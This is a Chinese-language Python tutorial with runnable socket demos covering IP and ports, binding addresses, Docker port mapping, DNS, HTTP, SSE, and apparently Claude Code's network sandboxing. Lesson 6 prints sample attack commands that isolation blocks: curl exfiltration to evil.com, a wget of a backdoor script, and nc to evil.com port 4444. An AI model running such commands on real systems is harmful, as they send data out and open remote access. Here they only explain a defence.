"""
教程 14b: 工程师需要的网络知识
================================================================
你学过七层协议，但那是"地图全貌"。
这个教程只讲工程中真正会碰到的东西:
  - IP 和端口到底是什么（用 Python 亲手建连接）
  - localhost / 127.0.0.1 / 0.0.0.0 的区别
  - 端口映射和转发（Docker 的 -p 8080:80 到底在干嘛）
  - HTTP 请求的完整旅程
  - 网络隔离意味着什么
  - Claude Code 为什么要断网

每一节都有可运行的 demo。
================================================================
"""

import os
import sys
import json
import socket
import struct
import threading
import time
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.request import urlopen, Request
from urllib.error import URLError
from pathlib import Path


# ============================================================
# 第一课: IP 地址和端口——网络世界的"地址"和"房间号"
# ============================================================

def lesson_1_ip_and_port():
    """
    类比:
      IP 地址 = 大楼的门牌号 (比如 "朝阳区望京街1号")
      端口号 = 大楼里的房间号 (比如 "3楼302室")

    要找到一个人，你需要: 门牌号 + 房间号 = IP + 端口

    常见端口号（像常见的店铺楼层）:
      80   = HTTP 网页服务（一楼大厅，所有人默认进的地方）
      443  = HTTPS 加密网页（安保升级版的一楼大厅）
      22   = SSH 远程登录（员工通道）
      3000 = 开发服务器常用（开发者的临时办公室）
      5432 = PostgreSQL 数据库（仓库）
      6379 = Redis 缓存（快递站）
    """
    print("=" * 60)
    print("第一课: IP 地址和端口")
    print("=" * 60)

    # 查看本机的 IP 地址
    hostname = socket.gethostname()
    print(f"\n  本机主机名: {hostname}")

    # 获取本机 IP
    try:
        # 这个技巧: 连一个外部地址（不真的发数据），看系统选了哪个本地 IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Google DNS，不会真的发数据
        local_ip = s.getsockname()[0]
        s.close()
        print(f"  本机局域网 IP: {local_ip}")
    except Exception:
        print("  本机局域网 IP: (无法获取，可能没联网)")

    print(f"\n  几个特殊的 IP 地址:")
    special_ips = [
        ("127.0.0.1", "localhost", "永远指向自己。不经过网卡，不出本机。"),
        ("0.0.0.0", "所有接口", "监听时用：表示'接受来自任何 IP 的连接'"),
        ("192.168.x.x", "局域网", "家里路由器分配的内部地址，外网看不到"),
        ("10.x.x.x", "内网", "公司/云服务的内部网络"),
        ("8.8.8.8", "Google DNS", "公共 DNS 服务器，常用来测试网络是否通"),
    ]
    for ip, name, desc in special_ips:
        print(f"    {ip:<16} ({name}) — {desc}")

    # 实际演示: 用 Python 创建一个 socket 连接
    print(f"\n  用 Python 亲手建一个网络连接:")
    print(f"  (连接 httpbin.org:80，这是一个公开的测试服务)")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect(("httpbin.org", 80))
        local_addr = sock.getsockname()
        remote_addr = sock.getpeername()
        print(f"    本地端: {local_addr[0]}:{local_addr[1]}")
        print(f"    远程端: {remote_addr[0]}:{remote_addr[1]}")
        print(f"    ↑ 系统自动分配了一个临时端口给你（通常在 49152-65535）")
        sock.close()
    except Exception as e:
        print(f"    连接失败: {e} (可能没联网)")


# ============================================================
# 第二课: 亲手写一个 HTTP 服务器
# ============================================================

def lesson_2_http_server():
    """
    HTTP 就是浏览器和服务器之间的"对话协议"。

    浏览器说: "GET /hello HTTP/1.1\r\nHost: localhost\r\n\r\n"
    服务器答: "HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello"

    就这么简单。HTTP 只是在 TCP 连接上传递的文本格式。
    """
    print("\n" + "=" * 60)
    print("第二课: 亲手写一个 HTTP 服务器")
    print("=" * 60)

    # 方法 1: 用最原始的 socket 写一个 HTTP 服务器
    print("\n  --- 方法 1: 用 raw socket 实现 ---")
    print("  这是最底层的方式，帮你理解 HTTP 到底是什么")

    def raw_http_server():
        """一个只用 socket 的 HTTP 服务器"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("127.0.0.1", 0))  # 端口 0 = 让系统自动分配
        port = server.getsockname()[1]
        server.listen(1)
        server.settimeout(3)
        return server, port

    server_sock, port = raw_http_server()
    print(f"  服务器启动在 127.0.0.1:{port}")

    # 在后台线程处理一个请求
    response_body = '{"message": "hello from raw socket server!"}'

    def handle_one_request():
        try:
            client, addr = server_sock.accept()
            # 读取请求（简化: 只读一次）
            request_data = client.recv(1024).decode()
            first_line = request_data.split("\r\n")[0]

            # 构造 HTTP 响应——就是一段文本
            response = (
                "HTTP/1.1 200 OK\r\n"
                f"Content-Length: {len(response_body)}\r\n"
                "Content-Type: application/json\r\n"
                "\r\n"
                f"{response_body}"
            )
            client.sendall(response.encode())
            client.close()
            return first_line
        except socket.timeout:
            return None

    thread = threading.Thread(target=handle_one_request)
    thread.start()

    # 作为客户端请求这个服务器
    time.sleep(0.1)
    try:
        resp = urlopen(f"http://127.0.0.1:{port}/hello")
        body = resp.read().decode()
        print(f"  客户端收到: {body}")
    except Exception as e:
        print(f"  请求失败: {e}")

    thread.join(timeout=3)
    server_sock.close()

    print(f"\n  HTTP 请求的完整旅程:")
    print(f"    1. 客户端创建 TCP 连接到 127.0.0.1:{port}")
    print(f"    2. 客户端发送文本: 'GET /hello HTTP/1.1\\r\\n...'")
    print(f"    3. 服务器读取文本，解析出方法(GET)和路径(/hello)")
    print(f"    4. 服务器发回文本: 'HTTP/1.1 200 OK\\r\\n...'")
    print(f"    5. 客户端解析响应，得到 body")
    print(f"    就这么简单——HTTP 不过是 TCP 上的文本格式约定")

    # 方法 2: 用标准库（实际开发中用这个）
    print(f"\n  --- 方法 2: 用 Python 标准库 ---")

    class MyHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Hello from stdlib server!")

        def log_message(self, format, *args):
            pass  # 静默日志

    server = HTTPServer(("127.0.0.1", 0), MyHandler)
    port2 = server.server_address[1]
    thread = threading.Thread(target=server.handle_request)
    thread.start()

    time.sleep(0.1)
    try:
        resp = urlopen(f"http://127.0.0.1:{port2}/")
        print(f"  客户端收到: {resp.read().decode()}")
    except Exception as e:
        print(f"  请求失败: {e}")

    thread.join(timeout=3)
    server.server_close()


# ============================================================
# 第三课: localhost vs 0.0.0.0 vs 局域网 IP
# ============================================================

def lesson_3_binding():
    """
    当你启动一个服务器时，你要决定"谁能连进来"。
    这取决于你绑定到哪个地址。
    """
    print("\n" + "=" * 60)
    print("第三课: 监听地址——谁能连进来？")
    print("=" * 60)

    print("""
    ┌──────────────────────────────────────────────────────────┐
    │  你的电脑                                                │
    │                                                          │
    │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────┐ │
    │  │ loopback    │  │ WiFi 网卡    │  │ 以太网卡        │ │
    │  │ 127.0.0.1   │  │ 192.168.1.5 │  │ 10.0.0.100     │ │
    │  └──────┬──────┘  └──────┬──────┘  └──────┬──────────┘ │
    │         │                │                 │             │
    │         ▼                ▼                 ▼             │
    │  ┌─────────────────────────────────────────────────────┐│
    │  │              操作系统网络栈                           ││
    │  │  服务器绑定到哪个地址，决定接受谁的连接:             ││
    │  │                                                      ││
    │  │  bind("127.0.0.1", 8080)                             ││
    │  │    → 只接受本机连接（最安全）                        ││
    │  │    → 外面的电脑连不上你                              ││
    │  │                                                      ││
    │  │  bind("192.168.1.5", 8080)                           ││
    │  │    → 只接受通过 WiFi 来的连接                        ││
    │  │                                                      ││
    │  │  bind("0.0.0.0", 8080)                               ││
    │  │    → 接受所有网卡的连接（最开放）                    ││
    │  │    → 局域网里的其他设备都能连上你                    ││
    │  └─────────────────────────────────────────────────────┘│
    └──────────────────────────────────────────────────────────┘
    """)

    # 实际演示不同绑定的效果
    print("  实际测试:")

    # 绑定到 127.0.0.1
    s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s1.bind(("127.0.0.1", 0))
    port1 = s1.getsockname()[1]
    print(f"    bind('127.0.0.1', {port1}) → 只有本机能连")
    s1.close()

    # 绑定到 0.0.0.0
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s2.bind(("0.0.0.0", 0))
    port2 = s2.getsockname()[1]
    print(f"    bind('0.0.0.0', {port2})   → 任何人都能连")
    s2.close()

    print(f"""
    开发时常见场景:
      python -m http.server 8000           → 默认 0.0.0.0 (所有人能连)
      flask run                            → 默认 127.0.0.1 (只有本机)
      flask run --host=0.0.0.0             → 改成所有人能连
      next dev                             → 默认 localhost

    安全原则:
      开发时用 127.0.0.1（别让同事连到你的调试服务器）
      生产时用 0.0.0.0（但前面要有防火墙/反向代理）
    """)


# ============================================================
# 第四课: 端口映射——Docker 的 -p 到底在干嘛
# ============================================================

def lesson_4_port_mapping():
    """
    Docker 的 -p 8080:80 是最容易让人困惑的参数之一。
    """
    print("\n" + "=" * 60)
    print("第四课: 端口映射")
    print("=" * 60)

    print("""
    场景: 你在 Docker 里运行了一个网站，它监听 80 端口。
    但容器有自己的网络命名空间——外面看不到容器里的 80 端口。

    docker run -p 8080:80 nginx
                  ↑    ↑
                  │    └── 容器内部的端口 (nginx 监听 80)
                  └─────── 宿主机暴露的端口 (你用 8080 访问)

    这就是"端口映射"——在两个隔离的网络之间开一个"传送门"。

    ┌──────────────────────────────────────────────┐
    │  宿主机                                      │
    │                                              │
    │  浏览器 ──→ localhost:8080 ──┐               │
    │                              │ 端口映射      │
    │  ┌──────────────────────┐    │               │
    │  │  Docker 容器          │    │               │
    │  │  (独立网络命名空间)    │    │               │
    │  │                      │    │               │
    │  │  nginx ←── :80 ◄─────┘               │
    │  │                      │                    │
    │  │  内部 IP: 172.17.0.2 │                    │
    │  └──────────────────────┘                    │
    └──────────────────────────────────────────────┘

    访问 localhost:8080 → Docker 把流量转发到容器的 80 → nginx 响应
    """)

    # 用 Python 模拟端口转发
    print("  用 Python 模拟端口转发的工作原理:")
    print("  (不需要 Docker，纯 Python 演示)")

    # "容器内部"的服务器
    internal_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    internal_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    internal_server.bind(("127.0.0.1", 0))
    internal_port = internal_server.getsockname()[1]
    internal_server.listen(1)
    internal_server.settimeout(3)

    # 端口转发器（模拟 Docker 的端口映射）
    proxy_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    proxy_server.bind(("127.0.0.1", 0))
    external_port = proxy_server.getsockname()[1]
    proxy_server.listen(1)
    proxy_server.settimeout(3)

    print(f"    '容器内' 服务监听: 127.0.0.1:{internal_port}")
    print(f"    '宿主机' 端口映射: 127.0.0.1:{external_port} → :{internal_port}")

    def internal_handler():
        """模拟容器内的服务"""
        try:
            client, _ = internal_server.accept()
            client.recv(1024)  # 读请求
            response = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Length: 24\r\n\r\n"
                "Hello from 'container'!"
            )
            client.sendall(response.encode())
            client.close()
        except socket.timeout:
            pass

    def proxy_handler():
        """模拟端口转发"""
        try:
            client, addr = proxy_server.accept()
            data = client.recv(4096)

            # 转发到"容器内部"
            upstream = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            upstream.connect(("127.0.0.1", internal_port))
            upstream.sendall(data)  # 转发请求
            response = upstream.recv(4096)  # 收响应
            upstream.close()

            client.sendall(response)  # 回传给客户端
            client.close()
        except (socket.timeout, ConnectionRefusedError):
            pass

    t1 = threading.Thread(target=internal_handler)
    t2 = threading.Thread(target=proxy_handler)
    t1.start()
    t2.start()

    time.sleep(0.2)
    try:
        resp = urlopen(f"http://127.0.0.1:{external_port}/")
        body = resp.read().decode()
        print(f"    客户端访问外部端口 → 收到: {body}")
        print(f"    ✓ 请求经过端口转发到达了'容器内'的服务!")
    except Exception as e:
        print(f"    请求失败: {e}")

    t1.join(timeout=3)
    t2.join(timeout=3)
    internal_server.close()
    proxy_server.close()

    print(f"""
    常见的端口映射写法:
      -p 8080:80        宿主 8080 → 容器 80
      -p 3000:3000      端口号相同（最常见）
      -p 127.0.0.1:8080:80   只允许本机访问映射端口
      -p 8080-8090:80-90     范围映射
    """)


# ============================================================
# 第五课: DNS——域名怎么变成 IP
# ============================================================

def lesson_5_dns():
    """
    你在浏览器输入 google.com，但网络只认 IP 地址。
    DNS 就是把域名翻译成 IP 地址的"电话簿"。
    """
    print("\n" + "=" * 60)
    print("第五课: DNS——域名到 IP 的翻译")
    print("=" * 60)

    print("""
    当你访问 https://api.anthropic.com 时:

    1. 浏览器问 DNS: "api.anthropic.com 的 IP 是什么？"
    2. DNS 回答: "104.18.32.7"（举例）
    3. 浏览器连接 104.18.32.7:443
    4. 开始 HTTPS 通信

    DNS 查询链:
    浏览器缓存 → 系统缓存 → 路由器 → ISP 的 DNS → 根 DNS
    (先问自己记不记得 → 问系统 → 问路由器 → 问运营商 → 问全球根服务器)
    """)

    # 实际做一次 DNS 解析
    domains = ["google.com", "github.com", "api.anthropic.com", "localhost"]
    print("  实际 DNS 解析:")
    for domain in domains:
        try:
            ip = socket.gethostbyname(domain)
            print(f"    {domain:<25} → {ip}")
        except socket.gaierror:
            print(f"    {domain:<25} → (解析失败)")

    # /etc/hosts 文件
    print(f"\n  特殊的 DNS: /etc/hosts 文件")
    print(f"  这个文件可以覆盖 DNS，让域名指向任何 IP:")
    try:
        with open("/etc/hosts") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    print(f"    {line}")
    except PermissionError:
        print("    (无权读取)")

    print(f"""
    Docker 中的 DNS:
      容器内有自己的 /etc/hosts 和 DNS 配置。
      同一个 docker network 里的容器可以用服务名互相访问:
        db 容器 → 名字是 "postgres"
        app 容器 → 可以 connect("postgres", 5432) 直接连
      这是 Docker 内建的 DNS 服务。
    """)


# ============================================================
# 第六课: 网络隔离——"断网"意味着什么
# ============================================================

def lesson_6_network_isolation():
    """
    Claude Code 的网络隔离（unshare --net）到底做了什么？
    """
    print("\n" + "=" * 60)
    print("第六课: 网络隔离")
    print("=" * 60)

    print("""
    正常进程看到的网络:
    ┌────────────────────────────────┐
    │  lo       127.0.0.1  (回环)    │  ← 本机通信
    │  eth0     192.168.1.5 (有线)   │  ← 局域网
    │  wlan0    192.168.1.6 (WiFi)   │  ← WiFi
    │  docker0  172.17.0.1 (Docker)  │  ← Docker 网桥
    └────────────────────────────────┘
    可以访问: localhost, 局域网, 互联网

    网络命名空间隔离后 (unshare --net):
    ┌────────────────────────────────┐
    │  lo       127.0.0.1  (回环)    │  ← 只有这一个！
    │                                │
    │  (没有其他网卡)                 │
    └────────────────────────────────┘
    可以访问: 只有自己
    不能访问: 局域网, 互联网, 甚至宿主机的其他端口
    """)

    # 演示: 测试网络是否可达
    print("  测试当前网络状态:")

    def test_connectivity(host, port, timeout=2):
        """测试能否连接到指定地址"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.close()
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False

    targets = [
        ("127.0.0.1", 22, "本机 SSH"),
        ("8.8.8.8", 53, "Google DNS (互联网)"),
        ("1.1.1.1", 53, "Cloudflare DNS (互联网)"),
    ]

    for host, port, name in targets:
        reachable = test_connectivity(host, port)
        status = "✓ 可达" if reachable else "✗ 不可达"
        print(f"    {status}  {host}:{port} ({name})")

    print(f"""
    网络隔离下, 命令做不了的事:
      curl https://evil.com/steal?data=xxx    → 连接被拒绝
      wget http://malware.com/backdoor.sh     → 连接被拒绝
      python -c "import urllib; ..."          → 连接被拒绝
      nc evil.com 4444                        → 连接被拒绝
      ping google.com                         → DNS 解析失败

    为什么 Claude Code 默认不开网络隔离？
      因为很多合法操作需要网络:
      - npm install / pip install   (下载包)
      - git clone / git push        (代码同步)
      - curl API 测试               (开发调试)
      所以默认 network_isolation=False，只在特别需要时开启。
    """)


# ============================================================
# 第七课: HTTP 请求的完整旅程
# ============================================================

def lesson_7_http_journey():
    """
    把前面所有知识串起来，看一个 HTTP 请求从发出到收到的完整旅程。
    """
    print("\n" + "=" * 60)
    print("第七课: HTTP 请求的完整旅程")
    print("=" * 60)

    print("""
    当 Claude Code 调用 Anthropic API 时发生了什么:

    ┌─────────────────────────────────────────────────────────┐
    │  1. 构造请求                                             │
    │     POST https://api.anthropic.com/v1/messages           │
    │     Headers: x-api-key: sk-ant-...                       │
    │     Body: {"model":"claude-opus-4-6", "messages":[...]}  │
    └──────────────────────┬──────────────────────────────────┘
                           ↓
    ┌──────────────────────────────────────────────────────────┐
    │  2. DNS 解析                                             │
    │     api.anthropic.com → 104.18.32.7                      │
    └──────────────────────┬───────────────────────────────────┘
                           ↓
    ┌──────────────────────────────────────────────────────────┐
    │  3. TCP 三次握手                                         │
    │     你 → SYN → 服务器                                    │
    │     你 ← SYN+ACK ← 服务器                               │
    │     你 → ACK → 服务器                                    │
    │     (建立连接，就像打电话先说"喂？""喂。""能听到"）        │
    └──────────────────────┬───────────────────────────────────┘
                           ↓
    ┌──────────────────────────────────────────────────────────┐
    │  4. TLS 握手 (因为是 HTTPS)                              │
    │     交换证书、协商加密算法、生成会话密钥                  │
    │     之后所有数据都加密传输                                │
    └──────────────────────┬───────────────────────────────────┘
                           ↓
    ┌──────────────────────────────────────────────────────────┐
    │  5. 发送 HTTP 请求                                       │
    │     POST /v1/messages HTTP/1.1\\r\\n                      │
    │     Host: api.anthropic.com\\r\\n                         │
    │     Content-Type: application/json\\r\\n                  │
    │     x-api-key: sk-ant-...\\r\\n                          │
    │     \\r\\n                                                │
    │     {"model":"claude-opus-4-6","stream":true,...}         │
    └──────────────────────┬───────────────────────────────────┘
                           ↓
    ┌──────────────────────────────────────────────────────────┐
    │  6. 服务器处理 + SSE 流式响应                            │
    │     HTTP/1.1 200 OK\\r\\n                                │
    │     Content-Type: text/event-stream\\r\\n                │
    │     \\r\\n                                                │
    │     event: message_start\\n                              │
    │     data: {"type":"message_start",...}\\n                │
    │     \\n                                                   │
    │     event: content_block_delta\\n                        │
    │     data: {"type":"content_block_delta",...}\\n          │
    │     \\n                                                   │
    │     ... (一个字一个字地推送)                              │
    └──────────────────────────────────────────────────────────┘
    """)

    # 实际发送一个 HTTP 请求并观察细节
    print("  实际观察一个 HTTP 请求:")
    try:
        req = Request(
            "http://httpbin.org/get",
            headers={"User-Agent": "Claude-Code-Tutorial/1.0"},
        )
        resp = urlopen(req, timeout=5)
        data = json.loads(resp.read().decode())
        print(f"    请求方法: GET")
        print(f"    目标 URL: http://httpbin.org/get")
        print(f"    响应状态: {resp.status}")
        print(f"    服务器看到的你的 IP: {data.get('origin', '未知')}")
        print(f"    服务器看到的 User-Agent: {data.get('headers', {}).get('User-Agent', '未知')}")
    except Exception as e:
        print(f"    请求失败: {e}")


# ============================================================
# 第八课: SSE——服务器如何"推"数据给你
# ============================================================

def lesson_8_sse():
    """
    SSE (Server-Sent Events) 是 Claude Code 流式输出的核心协议。
    和教程 10 呼应，但这里从网络层面解释。
    """
    print("\n" + "=" * 60)
    print("第八课: SSE 流式推送")
    print("=" * 60)

    print("""
    普通 HTTP: 请求 → 等待 → 一次性返回全部内容 → 断开
    SSE:       请求 → 服务器保持连接 → 一点一点推送 → 最终断开

    就像:
    普通 HTTP = 点外卖: 下单 → 等 → 一次全部送到
    SSE       = 吃自助餐的传送带: 坐下 → 一盘一盘地送过来

    SSE 的数据格式非常简单:
    """)

    # 用 Python 实现一个 SSE 服务器
    class SSEHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/event-stream")
            self.send_header("Cache-Control", "no-cache")
            self.end_headers()

            # 模拟 Claude API 的流式响应
            events = [
                'event: message_start\ndata: {"type":"message_start"}\n\n',
                'event: content_block_delta\ndata: {"type":"content_block_delta","delta":{"text":"Hello"}}\n\n',
                'event: content_block_delta\ndata: {"type":"content_block_delta","delta":{"text":" World"}}\n\n',
                'event: content_block_delta\ndata: {"type":"content_block_delta","delta":{"text":"!"}}\n\n',
                'event: message_stop\ndata: {"type":"message_stop"}\n\n',
            ]

            for event in events:
                self.wfile.write(event.encode())
                self.wfile.flush()
                time.sleep(0.1)  # 模拟逐字生成

        def log_message(self, format, *args):
            pass

    server = HTTPServer(("127.0.0.1", 0), SSEHandler)
    port = server.server_address[1]
    thread = threading.Thread(target=server.handle_request)
    thread.start()

    print(f"  SSE 服务器启动在 127.0.0.1:{port}")
    print(f"  模拟 Claude API 的流式响应:\n")

    time.sleep(0.1)
    try:
        resp = urlopen(f"http://127.0.0.1:{port}/stream")
        accumulated_text = ""
        raw = resp.read().decode()

        for line in raw.split("\n"):
            if line.startswith("event:"):
                event_name = line[7:]
                print(f"    [事件] {event_name}")
            elif line.startswith("data:"):
                data = json.loads(line[6:])
                if "delta" in data and "text" in data["delta"]:
                    accumulated_text += data["delta"]["text"]
                    print(f"    [数据] 文字片段: '{data['delta']['text']}'  "
                          f"(累计: '{accumulated_text}')")
    except Exception as e:
        print(f"    读取失败: {e}")

    thread.join(timeout=3)
    server.server_close()

    print(f"\n  这就是你在终端看到 Claude 逐字输出的原理:")
    print(f"  每收到一个 content_block_delta，立即打印 delta.text")


# ============================================================
# 第九课: 把网络知识和 Claude Code 串起来
# ============================================================

def lesson_9_claude_code_networking():
    """
    Claude Code 中涉及网络的所有环节。
    """
    print("\n" + "=" * 60)
    print("第九课: Claude Code 中的网络")
    print("=" * 60)

    print("""
    Claude Code 的网络使用场景:

    1. API 调用 (最核心)
       Claude Code → HTTPS → api.anthropic.com
       使用 SSE 流式接收模型输出
       重试策略: 429/503/502 等错误自动重试（教程 11）

    2. 工具执行中的网络
       模型请求 Bash("curl https://api.example.com")
       → 权限检查: 是否允许网络访问？
       → 沙箱检查: 网络隔离开了吗？
       → 执行命令: 实际发起网络请求

    3. MCP (Model Context Protocol)
       Claude Code → stdio/HTTP → MCP 服务器
       MCP 服务器提供额外的工具（数据库查询、Slack 发消息等）

    4. OAuth 认证
       Claude Code → HTTPS → claude.ai 认证服务
       获取/刷新 access token

    网络隔离如何影响这些:
    ┌───────────────────────────────────────────────────┐
    │  unshare --net 开启时:                             │
    │                                                    │
    │  ✓ API 调用: 不受影响（在沙箱外执行）              │
    │  ✗ Bash("curl ..."): 被隔离，无法访问网络         │
    │  ✓ MCP: 不受影响（在沙箱外）                       │
    │  ✓ OAuth: 不受影响（在沙箱外）                     │
    │                                                    │
    │  只有 Bash 工具执行的命令被断网！                   │
    │  Claude Code 自身的 API 通信不受影响。              │
    └───────────────────────────────────────────────────┘

    这是一个关键的设计决策:
    沙箱只隔离"用户命令"，不隔离"系统通信"。
    就像监狱里犯人不能打电话，但狱警可以。
    """)


# ============================================================
# 主程序
# ============================================================

if __name__ == "__main__":
    print("=" * 60)
    print("教程 14b: 工程师需要的网络知识")
    print("为理解 Claude Code 的网络隔离做铺垫")
    print("=" * 60)

    lesson_1_ip_and_port()
    lesson_2_http_server()
    lesson_3_binding()
    lesson_4_port_mapping()
    lesson_5_dns()
    lesson_6_network_isolation()
    lesson_7_http_journey()
    lesson_8_sse()
    lesson_9_claude_code_networking()

    print("\n" + "=" * 60)
    print("总结: 工程网络知识速查")
    print("=" * 60)
    print("""
    IP + 端口 = 网络地址 (门牌号 + 房间号)
    127.0.0.1  = 只有本机能访问（回环地址）
    0.0.0.0    = 监听所有接口（所有人能连）
    DNS        = 域名 → IP 的翻译簿
    TCP        = 可靠连接（打电话：先握手再通话）
    HTTP       = TCP 上的文本格式协议（GET/POST + Headers + Body）
    HTTPS      = HTTP + TLS 加密
    SSE        = HTTP 长连接 + 服务器逐条推送事件
    端口映射   = 在两个隔离网络之间开的传送门 (-p 8080:80)
    网络隔离   = 进程没有网卡，完全断网 (unshare --net)

    在 Claude Code 中:
    - API 通信用 HTTPS + SSE（在沙箱外，不受隔离影响）
    - Bash 命令的网络可以被隔离（在沙箱内，受 --net 影响）
    - 默认不隔离网络（因为 npm install 等需要网络）
    - 隔离后: 命令连 localhost 都不行（防止访问本机服务）
    """)
